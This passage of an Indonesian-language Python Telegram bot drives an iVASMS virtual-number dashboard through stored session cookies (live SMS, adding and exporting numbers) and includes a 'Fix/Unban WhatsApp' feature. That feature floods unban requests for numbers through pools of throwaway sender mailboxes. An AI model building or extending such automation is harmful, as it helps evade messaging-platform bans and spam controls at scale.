                reply_markup=get_back_keyboard(user_id)
            )
            return
        
        
        if isinstance(data, dict):
            if 'data' not in data:
                await msg.edit_text(
                    f" Response invalid format",
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_back_keyboard(user_id)
                )
                return
            items = data.get('data', [])
            total = data.get('recordsFiltered', 0)
        elif isinstance(data, list):
            items = data
            total = len(data)
        else:
            await msg.edit_text(
                " Unknown response format",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return
        
        if not items:
            await msg.edit_text(
                f"{_header('LIVE SMS · 10 TERBARU')}\n\n"
                f"  {em(E2,'⭐')} Total SMS: {total}\n"
                f"  {em(E1,'⭐')} Coba lagi nanti\n\n"
                f"{_footer()}",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("REFRESH", callback_data=f"live_sms_{user_id}", icon_custom_emoji_id="5870903672937911120", style="primary"),
                    InlineKeyboardButton("MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
                ]])
            )
            return
        

        now_makassar = (datetime.now() + timedelta(hours=8)).strftime('%d/%m/%Y %H:%M')

        header_txt = _header('LIVE SMS · 10 TERBARU')
        footer_txt = _footer()
        text = (
            f"{header_txt}\n\n"
            f"  {em(CE_WAKTU,'⏲')} <b>Waktu</b>  <code>{now_makassar} WITA</code>\n"
            f"  {em(E2,'⭐')} <b>Total</b>  <code>{total} SMS</code>\n"
            f"  {'─'*30}\n\n"
        )

        keyboard = []

        for i, item in enumerate(items[:10], 1):
            range_name = item.get('range', 'Unknown')
            termination = item.get('termination', {})
            test_number_html = termination.get('test_number', '')
            number = extract_number_from_html(test_number_html)
            termination_id = termination.get('id')
            sent_time = item.get('senttime', '')

            makassar_time = '–'
            try:
                if sent_time:
                    for fmt in ['%Y-%m-%d %H:%M:%S', '%d/%m/%Y %H:%M:%S', '%Y/%m/%d %H:%M:%S']:
                        try:
                            dt = datetime.strptime(sent_time, fmt)
                            makassar_time = (dt + timedelta(hours=8)).strftime('%H:%M:%S')
                            break
                        except:
                            continue
            except:
                makassar_time = sent_time or '–'

            num_display = f"<code>+{number}</code>" if number else "<i>–</i>"
            range_display = f"<code>{range_name}</code>"
            text += (
                f"  {em(E2,'⭐')} <b>{i:02d}.</b> {range_display}\n"
                f"      └ 📱 {num_display} │ 🕒 <code>{makassar_time}</code>\n\n"
            )

            display = (range_name[:15] + '…') if len(range_name) > 15 else range_name
            number_suffix = number[-6:] if number and len(number) >= 6 else (number or '???')

            # lm_{termination_id}_{filter_country}_{search_prefix}_{user_id}
            filter_country = range_name.split()[0] if ' ' in range_name else range_name
            filter_country = filter_country.replace('_', '')
            if number and len(number) > 5:
                search_prefix = number[:-5]
            else:
                search_prefix = number or ''

            # Cache mapping termination_id -> range_name agar handler tidak perlu re-fetch
            if context is not None:
                term_id_map = context.user_data.get(f'term_id_map_{user_id}', {})
                term_id_map[str(termination_id)] = range_name
                context.user_data[f'term_id_map_{user_id}'] = term_id_map

            emoji_id = get_flag_custom_emoji_id(range_name)
            keyboard.append([
                InlineKeyboardButton(
                    f"{display} · {number_suffix}",
                    callback_data=f"lm_{termination_id}_{filter_country}_{search_prefix}_{user_id}",
                    icon_custom_emoji_id=emoji_id,
                    style="success"
                )
            ])

        keyboard.append([
            InlineKeyboardButton("SEMUA", callback_data=f"live_filter__{user_id}", icon_custom_emoji_id=get_flag_custom_emoji_id("DEFAULT"), style="primary"),
            InlineKeyboardButton("PERU", callback_data=f"live_filter_peru_{user_id}", icon_custom_emoji_id=get_flag_custom_emoji_id("PERU"), style="primary"),
            InlineKeyboardButton("GERMAN", callback_data=f"live_filter_german_{user_id}", icon_custom_emoji_id=get_flag_custom_emoji_id("GERMAN"), style="primary")
        ])
        keyboard.append([
            InlineKeyboardButton("REFRESH", callback_data=f"live_sms_{user_id}", icon_custom_emoji_id="5870903672937911120", style="primary"),
            InlineKeyboardButton("MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
        ])

        text += footer_txt

        markup = InlineKeyboardMarkup(keyboard)
        # Simpan ke cache agar next klik instan
        if context is not None:
            context.bot_data[f'live_cache_{user_id}'] = {'text': text, 'markup': markup}

        await msg.edit_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=markup
        )
        
    except Exception as e:
        logger.error(f"Error process_live_sms_background: {e}")
        try:
            await msg.edit_text(
                f"❌ Error: {html.escape(str(e)[:100])}",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
        except Exception:
            await msg.edit_text(
                f"❌ Error: {str(e)[:100]}",
                reply_markup=get_back_keyboard(user_id)
            )
        
async def process_bulk_confirm_background(msg, user_id, session, csrf):
    """Background process untuk bulk confirm"""

    try:
        success, message = await bg.run(user_id, bulk_return_numbers, session, csrf)
        
        safe_msg = html.escape(str(message))
        if success:
            await msg.edit_text(
                _build(TEMPLATE_SUCCESS, 'BULK · SELESAI', message=f"  {em(E1,'⭐')} <b>BERHASIL</b>\n\n  {safe_msg}"),
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
        else:
            await msg.edit_text(
                _build(TEMPLATE_ERROR, 'BULK · GAGAL', message=f"  {em(E2,'⭐')} <b>GAGAL</b>\n\n  {safe_msg}"),
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
    except Exception as e:
        logger.error(f"Error bulk confirm: {e}")
        try:
            await msg.edit_text(
                f"❌ Error: {html.escape(str(e)[:100])}",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
        except Exception:
            await msg.edit_text(
                f"❌ Error: {str(e)[:100]}",
                reply_markup=get_back_keyboard(user_id)
            )

async def process_export_background(msg, user_id, format_type, context, session, csrf):
    """Background process untuk export"""

    try:
        success, filename, message = await bg.run(user_id, export_numbers, session, csrf, format_type)
        
        if success and filename:
            try:
                if os.path.getsize(filename) == 0:
                    await msg.edit_text(
                        f"📭 <b>TIDAK ADA NOMOR</b>\n\nFile kosong.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=get_back_keyboard(user_id)
                    )
                    try:
                        os.remove(filename)
                    except:
                        pass
                    return
                
                # Hitung statistik file untuk caption yang informatif
                file_size = os.path.getsize(filename)
                line_count = 0
                if format_type == 'txt':
                    try:
                        with open(filename, 'r', encoding='utf-8') as tf:
                            line_count = sum(1 for _ in tf)
                    except:
                        pass

                # Format ukuran file
                if file_size >= 1048576:
                    size_display = f"{file_size/1048576:.1f} MB"
                elif file_size >= 1024:
                    size_display = f"{file_size/1024:.1f} KB"
                else:
                    size_display = f"{file_size} B"

                now_str = datetime.now().strftime('%d/%m/%Y %H:%M')

                if format_type == 'txt' and line_count > 0:
                    caption = (
                        f"📄 File {format_type.upper()} siap\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"📊 Total Nomor  : {line_count:,} line\n"
                        f"📁 Ukuran File  : {size_display}\n"
                        f"⏲ Waktu Export : {now_str}\n"
                        f"━━━━━━━━━━━━━━━━━━━━"
                    )
                else:
                    caption = (
                        f"📄 File {format_type.upper()} siap\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"📁 Ukuran File  : {size_display}\n"
                        f"⏲ Waktu Export : {now_str}\n"
                        f"━━━━━━━━━━━━━━━━━━━━"
                    )

                with open(filename, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=msg.chat_id,
                        document=f,
                        filename=os.path.basename(filename),
                        caption=caption
                    )
                
                try:
                    os.remove(filename)
                except:
                    pass
                
                await msg.delete()
                
            except Exception as e:
                await msg.edit_text(
                    f"{em(E2, '⭐')} <b>ERROR</b>\n\nGagal mengirim file: {str(e)}",
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_back_keyboard(user_id)
                )
                try:
                    os.remove(filename)
                except:
                    pass
        else:
            error_msg = message if message else "Tidak ada nomor"
            await msg.edit_text(
                f"📭 <b>TIDAK ADA NOMOR</b>\n\n{error_msg}",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
    except Exception as e:
        logger.error(f"Error export: {e}")
        await msg.edit_text(
            f" Error: {str(e)[:100]}",
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id)
        )

async def process_top_refresh_background(msg, user_id):
    """Background process untuk top refresh"""

    try:
        success, result = await bg.run(user_id, fetch_top_countries)
        
        if not success:
            await msg.edit_text(
                f"{em(E2, '⭐')} <b>GAGAL</b>\n\n{result}",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return
        
        total, countries = result
        
        
        max_count = countries[0]['count'] if countries else 1
        
        
        countries_text = ""
        for i, country in enumerate(countries[:30], 1):
            flag = get_country_flag(country['country'])
            country_name = country['country']
            count = country['count']
            bar_length = int((count / max_count) * 10)
            bar = '█' * bar_length + '░' * (10 - bar_length)
            percentage = int((count / max_count) * 100)
            medal = '🥇' if i == 1 else ('🥈' if i == 2 else ('🥉' if i == 3 else f'{i:02d}.'))
            countries_text += (
                f"  {medal} {flag} <b>{country_name}</b>\n"
                f"     <code>{bar}</code> {count:>4} ({percentage:>3}%)\n\n"
            )
        
        now_str = (datetime.now() + timedelta(hours=8)).strftime('%d/%m %H:%M WITA')
        header_txt = _header('TOP NEGARA AKTIF')
        footer_txt = _footer()
        text = (
            f"{header_txt}\n\n"
            f"  {em(E2,'⭐')} <b>Update</b>  <code>{now_str}</code>\n"
            f"  {em(E2,'⭐')} <b>Total</b>   <code>{total} negara</code>\n\n"
            f"{'─'*30}\n\n"
            f"{countries_text}\n"
            f"{footer_txt}"
        )

        await msg.edit_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("REFRESH", callback_data=f"top_refresh_{user_id}", icon_custom_emoji_id="5870903672937911120", style="primary"),
                InlineKeyboardButton("MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
            ]])
        )
    except Exception as e:
        logger.error(f"Error top refresh: {e}")
        await msg.edit_text(
            f" Error: {str(e)[:100]}",
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id)
        )


async def process_all_platforms_background(msg, user_id):
    """Background process untuk semua platform - non-blocking"""
    try:
        _, _, _, _, cookies_dict, csrf, logged_in = get_user_session(user_id)

        if not logged_in or not cookies_dict:
            await msg.edit_text(
                f"{em(E2,'⭐')} Session expired! Silahkan login ulang.",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return

        session = requests.Session()
        for key, value in cookies_dict.items():
            session.cookies.set(key, value)

        success, data = await bg.run(user_id, fetch_all_platforms_with_session, session)

        if not success or not data:
            error_detail = data if not success else 'Data kosong'
            await msg.edit_text(
                f"{em(E2, '⭐')} <b>GAGAL MENGAMBIL DATA</b>\n\n{error_detail}",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return

        total_messages = sum(p['count'] for p in data)

        text = f"""{em(E5,'🏴\u200d☠️')} <b>TOP 10 PLATFORM AKTIF</b>
━━━━━━━━━━━━━━━━━━━━━━
{em(E1,'⭐')} <b>Sumber</b>: iVASMS Dashboard
{em(E2,'⭐')} <b>Total</b>: {total_messages:,} message
━━━━━━━━━━━━━━━━━━━━━━

"""

        for i, platform in enumerate(data[:10], 1):
            emoji = get_platform_emoji(platform['name'])
            count_str = f"{platform['count']:,}"
            text += f"{em(E2,'⭐')} <b>{i}.</b> {emoji} {platform['name']}\n"
            text += f"     {em(CE_LOADING,'🟠')} <code>{count_str} message</code>\n\n"

        text += f"━━━━━━━━━━━━━━━━━━━━━━\n"
        text += f"{em(E4,'🎧')} <i>Powered by DikZz</i>"

        await msg.edit_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("REFRESH", callback_data=f"all_refresh_{user_id}", icon_custom_emoji_id="5870903672937911120", style="primary"),
                InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
            ]])
        )
    except Exception as e:
        logger.error(f"Error all platforms background: {e}")
        await msg.edit_text(
            f" Error: {str(e)[:100]}",
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id)
        )


async def add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command /add - Single add via WebSocket"""
    if not is_allowed_user(update.effective_user.id):
        return
    try:
        user_id = update.effective_user.id

        
        if not check_user_login(user_id):
            await update.message.reply_text(
                " Kamu belum login! Gunakan /cookies dulu.",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return

        if not context.args:
            await update.message.reply_text(
                "📝 <b>CARA PENGGUNAAN /add</b>\n\n"
                "Format: /add [RANGE]\n\n"
                "Contoh:\n"
                "• /add EGYPT 70\n"
                "• /add PERU 91\n"
                "• /add KAZAKHSTAN 13003\n\n"
                "💡 Gunakan /top untuk lihat negara aktif\n"
                "⚡ Menggunakan WebSocket untuk response cepat",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return

        input_text = " ".join(context.args)
        
        
        email, _, _, _, _, _, _ = get_user_session(user_id)
        
        
        msg = await update.message.reply_text(
            f"{em(E5,'🏴‍☠️')} <b>iVASMS · PROCESS ADD NUMBER</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{em(E1,'⭐')} <b>Range:</b> <code>{input_text}</code>\n"
            f"{em(E2,'⭐')} <b>Akun:</b> <code>{email}</code>\n\n"
            f"{em(CE_LOADING,'🟠')} <b>Status:</b>\n"
            f"├─ Pre-Bulk Cleaning: <code>[Running...] 🗑</code>\n"
            f"├─ Socket Connection: <code>[Pending]</code>\n"
            f"└─ Add Number Process: <code>[Pending]</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{em(E4,'🎧')} <i>Powered by DikZz</i>",
            parse_mode=ParseMode.HTML
        )

        
        task_id = f"add_{user_id}_{int(time.time())}"

        
        asyncio.create_task(process_add_background(
            msg, user_id, email, input_text, task_id, "add"
        ))

    except Exception as e:
        logger.error(f"Error add_command: {e}")
        await update.message.reply_text(
            f" Error: {str(e)[:100]}",
            parse_mode=ParseMode.HTML
        )


async def owner_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Menampilkan menu utama owner"""
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return
        
    query = update.callback_query
    if query:
        await query.answer()
        
    status_mt = "🟢 AKTIF" if MAINTENANCE_MODE else "🔴 NON-AKTIF"
    
    cur.execute("SELECT target_user_id, target_email FROM owner_switch WHERE owner_id = ?", (USER_ID,))
    switched = cur.fetchone()
    switched_status = ""
    if switched:
        switched_status = f"\n{em(E5,'🏴‍☠️')} <b>Sesi Target:</b> <code>{switched[0]}</code> ({switched[1]})"
    
    text = (
        f"{em(E2, '👑')} <b>PENGATURAN OWNER</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(CE_PROFILE, '👤')} <b>ID Owner:</b> <code>{USER_ID}</code>\n"
        f"{em(E5, '🔧')} <b>Status Maintenance:</b> {status_mt}{switched_status}\n\n"
        f"Silakan pilih menu khusus owner di bawah ini:\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    keyboard = [
        [
            InlineKeyboardButton("LIST USER", callback_data="owner_list_users", icon_custom_emoji_id="5870903672937911120", style="primary"),
            InlineKeyboardButton("TAMBAH USER", callback_data="owner_add_user_prompt", icon_custom_emoji_id="5348028367138483442", style="success")
        ],
        [
            InlineKeyboardButton("SWITCH SESI", callback_data="owner_switch_list", icon_custom_emoji_id="5870903672937911120", style="primary"),
            InlineKeyboardButton("UNSWITCH", callback_data="owner_unswitch", icon_custom_emoji_id="5449847653586188540", style="danger")
        ],
        [
            InlineKeyboardButton("ADD ADMIN", callback_data="owner_add_admin_prompt", icon_custom_emoji_id="5348028367138483442", style="success"),
            InlineKeyboardButton("DEL ADMIN", callback_data="owner_del_admin_prompt", icon_custom_emoji_id="5870875489362513438", style="danger")
        ],
        [
            InlineKeyboardButton("BAN USER", callback_data="owner_ban_user_prompt", icon_custom_emoji_id="5870875489362513438", style="danger"),
            InlineKeyboardButton("UNBAN USER", callback_data="owner_unban_user_prompt", icon_custom_emoji_id="5870875489362513438", style="danger")
        ],
        [
            InlineKeyboardButton("BROADCAST", callback_data="owner_broadcast_prompt", icon_custom_emoji_id="5213001905386567370", style="primary"),
            InlineKeyboardButton("STATS USER", callback_data="owner_stats", icon_custom_emoji_id="5870903672937911120", style="primary")
        ],
        [
            InlineKeyboardButton("TOGGLE MAINTENANCE", callback_data="owner_toggle_mt", icon_custom_emoji_id="5436078005615086151", style="danger")
        ],
        [
            InlineKeyboardButton(f"SMS AKTIF {'🟢' if USER_ID in sms_aktif_users else '🔴'}", callback_data=f"smsaktif_menu_{USER_ID}", style="primary"),
            InlineKeyboardButton("SMS AKTIF STATUS", callback_data="owner_smsaktif_status", icon_custom_emoji_id="5870903672937911120", style="primary")
        ],
        [
            InlineKeyboardButton("KEMBALI KE MAIN MENU", callback_data=f"menu_start_{USER_ID}", icon_custom_emoji_id="5449847653586188540", style="danger")
        ]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if query:
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)

async def owner_list_users_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Menampilkan list user yang diizinkan dengan opsi HAPUS"""
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return
        
    query = update.callback_query
    if query:
        await query.answer()
        
    cur.execute("""
        SELECT user_id, username, added_by, added_at 
        FROM allowed_users 
        ORDER BY added_at DESC
    """)
    users = cur.fetchall()
    
    text = f"{em(CE_PROFILE, '👤')} <b>DAFTAR USER YANG DIIZINKAN</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
    
    keyboard = []
    
    if not users:
        text += "📭 <i>Belum ada user yang diizinkan selain owner.</i>\n"
    else:
        for uid, username, added_by, added_at in users:
            username_display = f"@{username}" if username else "no_username"
            tag = " (Owner)" if uid == USER_ID else ""
            text += f"  {em(E1, '⭐')} <code>{uid}</code> | <code>{username_display}</code>{tag}\n"
            
            # Jangan tampilkan tombol hapus untuk owner sendiri
            if uid != USER_ID:
                keyboard.append([
                    InlineKeyboardButton(f"HAPUS: {uid} ({username_display})", callback_data=f"owner_del_user_{uid}", icon_custom_emoji_id="5870875489362513438", style="danger")
                ])
                
    text += f"━━━━━━━━━━━━━━━━━━━━━━\nTotal: <b>{len(users)} user</b>"
    keyboard.append([InlineKeyboardButton("KEMBALI", callback_data="owner_menu", icon_custom_emoji_id="5449847653586188540", style="danger")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    if query:
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)


async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk semua callback"""
    query = update.callback_query
    data = query.data or ""
    user_id = update.effective_user.id

    # Auto-update username Telegram di DB
    update_user_username(update.effective_user)

    # ── Callback PUBLIK (selalu boleh ditekan, samakan dengan /fix yang public) ─
    # Bypass gate `is_allowed_user`. Tetap dipastikan hanya inisiator yang boleh
    # menekan tombolnya (callback_data sudah berisi `_{user_id}` di belakang).
    _public_prefixes = (
        'fix_confirm_', 'fix_cancel_',
        'create_confirm_', 'create_cancel_', 'create_sel_', 'create_api_',
        'proxy_socks5_', 'proxy_http_', 'proxy_cancel_', 'proxy_close_', 'proxy_again_',
        'fixmenu_', 'fix_back_',
        'fix_srv1_', 'fix_srv2_', 'fix_srv3_',
        'fxinput_', 'fxshow_', 'fxdel_',
        'fxdelall_', 'fxdels1_', 'fxdels2_', 'fxprev_',
        'tgcheck_confirm_', 'tgcheck_abort_', 'tgcheck_cancel_',
        'tgcheck_history_', 'tgcheck_clear_', 'tgcheck_export_',
        'tgcheck_detail_', 'tgcheck_login_', 'sender_checkall_', 'sender_deldead_', 'sender_delall_',
        'sessions_del_', 'sessions_delall_',
        'loginexp_sms_', 'loginexp_app_', 'loginexp_all_', 'loginexp_done_',
        'unban_send_', 'unban_cancel_',
    )
    if data.startswith(_public_prefixes):
        try:
            # Format: prefix_<owner_id>
            owner_id = int(data.rsplit('_', 1)[-1])
        except Exception:
            owner_id = user_id
        if owner_id != user_id:
            # User lain mencoba menekan tombol orang lain → tolak senyap
            try:
                await query.answer("Tombol ini bukan untukmu.", show_alert=False)
            except Exception:
                pass
            return
        # Lanjut ke handler di bawah (jangan return!) — fall-through.
    else:
        # Untuk callback non-publik, gate `is_allowed_user` tetap berlaku.
        if not is_allowed_user(user_id):
            await query.answer()
            try: await query.message.delete()
            except: pass
            return

    if data == 'noop':
        await query.answer()
        return

    # ── Fix WhatsApp callbacks ──
    if data.startswith('fix_confirm_'):
        await query.answer()
        fix_key = f"fix_numbers_{user_id}"
        numbers = context.user_data.get(fix_key, [])
        if not numbers:
            await query.message.edit_text(
                _screen('FIX WHATSAPP',
                        f"{em(E2,'❌')} Data nomor tidak ditemukan. Coba /fix lagi."),
                parse_mode=ParseMode.HTML,
            )
            return
        del context.user_data[fix_key]
        await query.message.edit_text(
            _screen('FIX WHATSAPP',
                    f"{em(CE_LOADING,'🟠')} <b>Memulai proses {len(numbers)} nomor...</b>"),
            parse_mode=ParseMode.HTML,
        )
        asyncio.create_task(_process_fix_background(numbers, user_id, query.message, context))
        return

    if data.startswith('fix_cancel_'):
        await query.answer()
        fix_key = f"fix_numbers_{user_id}"
        context.user_data.pop(fix_key, None)
        await query.message.edit_text(
            _screen('FIX WHATSAPP', f"{em(E2,'❌')} <b>Dibatalkan.</b>"),
            parse_mode=ParseMode.HTML,
        )
        return

    # ── UNBAN WHATSAPP callbacks ──
    if data.startswith('unban_send_'):
        await query.answer()
        unban_key = f"unban_numbers_{user_id}"
        numbers = context.user_data.get(unban_key, [])
        if not numbers:
            await query.message.edit_text(
                _screen('UNBAN WHATSAPP',
                        f"{em(E2,'❌')} Data nomor tidak ditemukan. Coba /unban lagi."),
                parse_mode=ParseMode.HTML,
            )
            return
        del context.user_data[unban_key]
        await query.message.edit_text(
            _screen('UNBAN WHATSAPP', (
                f"{em(CE_LOADING,'🟠')} <b>Memulai proses UNBAN {len(numbers)} nomor...</b>\n\n"
                f"  {em(CE_WHATSAPP,'❤️')} Sender: <b>5 sender per nomor</b>\n"
                f"  {em(CE_NOMOR,'📞')} Nomor: <b>{len(numbers)}</b>\n\n"
                f"<i>Menyiapkan sender, mohon tunggu...</i>"
            )),
            parse_mode=ParseMode.HTML,
        )
        asyncio.create_task(_process_unban_background(numbers, user_id, query.message, context))
        return

    if data.startswith('unban_cancel_'):
        await query.answer()
        unban_key = f"unban_numbers_{user_id}"
        context.user_data.pop(unban_key, None)
        await query.message.edit_text(
            _screen('UNBAN WHATSAPP', f"{em(E2,'❌')} <b>Dibatalkan.</b>"),
            parse_mode=ParseMode.HTML,
        )
        return

    # ── SERVER 1 / SERVER 2: bedakan partition sender pool ──
    # ── SERVER 3: jalur AtomicMail API (tanpa pool Site.pro) ──
    if data.startswith('fix_srv3_'):
        await query.answer()
        fix_key = f"fix_numbers_{user_id}"
        numbers = context.user_data.get(fix_key, [])
        if not numbers:
            await query.message.edit_text(
                _screen('FIX WHATSAPP',
                        f"{em(E2,'❌')} Data nomor tidak ditemukan. Coba /fix lagi."),
                parse_mode=ParseMode.HTML,
            )
            return
        del context.user_data[fix_key]
        context.user_data['fix_server'] = 3
        await query.message.edit_text(
            _screen('FIX WHATSAPP · SERVER 3 (API)',
                    f"{em(CE_LOADING,'🟠')} <b>SERVER 3</b> — memulai {len(numbers)} nomor via API..."),
            parse_mode=ParseMode.HTML,
        )
        asyncio.create_task(_process_fix_api_background(numbers, user_id, query.message, context))
        return

    # ── SERVER 1 / SERVER 2: bedakan partition sender pool ──
    if data.startswith('fix_srv1_') or data.startswith('fix_srv2_'):
        await query.answer()
        server = 1 if data.startswith('fix_srv1_') else 2
        fix_key = f"fix_numbers_{user_id}"
        numbers = context.user_data.get(fix_key, [])
        if not numbers:
            await query.message.edit_text(
                _screen('FIX WHATSAPP',
                        f"{em(E2,'❌')} Data nomor tidak ditemukan. Coba /fix lagi."),
                parse_mode=ParseMode.HTML,
            )
            return

        # Cek stok sender di partisi yang dipilih. Kalau kosong → Maintenance,
        # JANGAN biarkan pipeline buat akun baru tanpa konteks.
        try:
            if server == 1:
                cur.execute(
                    "SELECT COUNT(*) FROM sitepro_mailboxes m "
                    "WHERE m.mailbox_id IS NOT NULL AND m.mailbox_id > 0 "
                    f"AND m.id IN ({_S1_IDS_SQL})"
                )
            else:
                cur.execute(
                    "SELECT COUNT(*) FROM sitepro_mailboxes m "
                    "WHERE m.mailbox_id IS NOT NULL AND m.mailbox_id > 0 "
                    f"AND m.id NOT IN ({_S1_IDS_SQL})"
                )
            stock = (cur.fetchone() or [0])[0]
        except Exception:
            stock = 0

        if stock <= 0:
            await query.message.edit_text(
                _screen('FIX WHATSAPP', (
                    f"{em(E2,'🛠')} <b>SERVER {server} — MAINTENANCE</b>\n\n"
                    f"Belum ada sender pada partisi server {server} "
                    f"({'1–150' if server == 1 else '150–end'}).\n"
                    f"Silakan pilih <b>SERVER {2 if server == 1 else 1}</b>, "
                    f"atau hubungi admin untuk membuka partisi ini."
                )),
                parse_mode=ParseMode.HTML,
            )
            return

        del context.user_data[fix_key]
        context.user_data['fix_server'] = server
        await query.message.edit_text(
            _screen('FIX WHATSAPP',
                    f"{em(CE_LOADING,'🟠')} <b>SERVER {server}</b> — memulai {len(numbers)} nomor..."),
            parse_mode=ParseMode.HTML,
        )
        asyncio.create_task(_process_fix_background(numbers, user_id, query.message, context))
        return

    # ── FIX MERAH inline wizard (tombol dari /start) ─────────────────────
    if data.startswith('fixmenu_'):
        await query.answer()
        is_ow = is_owner(user_id)
        rows = [[
            InlineKeyboardButton("KIRIM FIX", callback_data=f"fxinput_{user_id}",
                                 icon_custom_emoji_id=CE_WHATSAPP, style="danger"),
        ]]
        if is_ow:
            rows.append([
                InlineKeyboardButton("SENDER", callback_data=f"fxshow_{user_id}",
                                     icon_custom_emoji_id=CE_AKUN, style="primary"),
                InlineKeyboardButton("DELETE", callback_data=f"fxdel_{user_id}",
                                     icon_custom_emoji_id=E2, style="primary"),
            ])
            rows.append([
                InlineKeyboardButton("TEMPLATE", callback_data=f"fxprev_{user_id}",
                                     icon_custom_emoji_id=E1, style="primary"),
            ])
        rows.append([
            InlineKeyboardButton("TUTUP", callback_data=f"fix_back_{user_id}",
                                 icon_custom_emoji_id=E2, style="primary"),
        ])
        menu = _screen('FIX MERAH WHATSAPP', (
            f"{em(CE_WHATSAPP,'❤️')} <b>Panel Fix Merah WhatsApp</b>\n\n"
            f"{em(E1,'📞')} <b>KIRIM FIX</b> — kirim permintaan unban\n"
            + ("\n"
               f"{em(CE_AKUN,'👤')} <b>SENDER</b> — lihat jumlah sender aktif\n"
               f"{em(E2,'🗑')} <b>DELETE</b> — hapus sender dari pool\n"
               f"{em(E1,'📝')} <b>TEMPLATE</b> — preview pesan /fix\n"
               if is_owner(user_id) else "")
            + f"\nPilih menu di bawah."
        ))
        try:
            await query.message.edit_text(menu, parse_mode=ParseMode.HTML,
                                          reply_markup=InlineKeyboardMarkup(rows))
        except Exception:
            pass
        return

    # ── KIRIM FIX: minta input nomor (wizard lama) ──
    if data.startswith('fxinput_'):
        await query.answer()
        context.user_data['fixmenu_waiting'] = True
        context.user_data['fixmenu_message_id'] = query.message.message_id
        prompt = _screen('FIX MERAH WHATSAPP', (
            f"{em(CE_WHATSAPP,'❤️')} <b>Kirim nomor WhatsApp yang mau di-fix.</b>\n\n"
            f"<b>Cara pakai:</b>\n"
            f"  Cukup ketik / paste nomornya, contoh:\n"
            f"  <code>6287409824927</code>\n"
            f"  <code>6284271038048</code>\n\n"
            f"Bisa juga di satu baris: <code>6287409824927, 6284271038048</code>\n\n"
            f"📌 Maks <b>5 nomor</b> per request (owner: 50).\n"
            f"📌 Pesan custom bisa diatur lewat <code>/set</code>.\n\n"
            f"Tekan <b>BATAL</b> untuk kembali."
        ))
        kb = InlineKeyboardMarkup([[
            InlineKeyboardButton("BATAL", callback_data=f"fixmenu_{user_id}",
                                 icon_custom_emoji_id=E2, style="danger"),
        ]])
        try:
            await query.message.edit_text(prompt, parse_mode=ParseMode.HTML, reply_markup=kb)
        except Exception:
            pass
        return

    # ── SENDER: tampilkan jumlah sender aktif (owner) ──
    if data.startswith('fxshow_'):
        await query.answer()
        if not is_owner(user_id):
            return
        kb = InlineKeyboardMarkup([[
            InlineKeyboardButton("KEMBALI", callback_data=f"fixmenu_{user_id}",
                                 icon_custom_emoji_id=E1, style="primary"),
        ]])
        try:
            await query.message.edit_text(_render_sender_card(),
                                          parse_mode=ParseMode.HTML, reply_markup=kb)
        except Exception:
            pass
        return

    # ── DELETE: menu hapus sender (owner) ──
    if data.startswith('fxdel_'):
        await query.answer()
        if not is_owner(user_id):
            return
        s = _count_senders()
        kb = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("HAPUS SERVER 1", callback_data=f"fxdels1_{user_id}",
                                     icon_custom_emoji_id=E2, style="danger"),
                InlineKeyboardButton("HAPUS SERVER 2", callback_data=f"fxdels2_{user_id}",
                                     icon_custom_emoji_id=E2, style="danger"),
            ],
            [
